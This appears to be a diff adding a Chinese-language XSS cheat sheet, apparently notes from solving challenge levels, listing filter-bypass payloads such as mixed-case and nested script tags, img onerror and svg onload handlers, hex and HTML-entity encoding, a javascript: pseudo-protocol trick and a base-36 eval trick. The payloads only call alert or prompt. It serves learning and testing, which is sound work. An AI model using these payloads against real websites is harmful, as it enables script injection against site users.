@@ -1,0 +1,68 @@
+<script>alert("1");</script>
+
+过滤一个script:
+改变大小写：
+<sCript>alert("1");</scRipt>
+
+标签包含标签：
+<scr<script>ipt>alert("1");</scr</script>ipt>
+
+过滤各种大小写script:
+<img src="/" onerror=alert("1")>
+<svg/onload=alert("1")>
+
+过滤alert():
+编码：
+<img src="/" onerror=eval("\x61\x6c\x65\x72\x74\x28\x271\x27\x29")>
+prompt:
+<img src="/" onerror=prompt("1")>
+
+源码中变量赋值:
+</script><script>alert("1");"
+
+转义<>:
+';alert(1)//
+借用自带的<script>标签，注释语句最后的'
+
+document.write(location.hash.substring(1)):
+#<script>alert(1);</script>
+取URL栏中从#后面第一个开始
+
+
+
+http://lorexxar.cn/2015/07/02/xss-p/
+"><svg/onload="prompt(1)
+"onresize=prompt(1)>//IE
+
+过滤无法使用<script></script>:
+<svg/onload=prompt(1)
+
+过滤(=:
+把做括号ascii编码:
+<svg><script>prompt&#40;1)</script>
+
+这里的svg不能去掉，由于xml编码特性。
+在SVG向量里面的script元素（或者其他CDATA元素 ），会先进行xml解析。
+因此&#x28（十六进制）或者&#40（十进制）或者&lpar；
+（html实体编码）会被还原成（。
+
+->被过滤，源码被<!-- -->注释：
+--!><svg/onload=prompt(1)
+
+onxxx=替换成_,后面附加type=text:
+"type=image src onerror
+="prompt(1)
+回车绕过，后面的type不可以覆盖前面的type
+
+分析源码可以看到，大概是由#分割，
+前面赋给form.action，使method=post，后面以json格式赋给formdata，把formdata中的属性循环赋给了input。
+后面满足forms.action存在即执行提交，所以这里使用js伪协议。
+javascript:prompt(1)#{"action":0}
+
+过滤几乎所有的符号，只有()可用：
+"(prompt(1))in"
+in让字母有操作符的功能
+
+过滤'，用alert代替prompt:
+x=parseInt("prompt",36);
+eval((x).toString(36))(1);
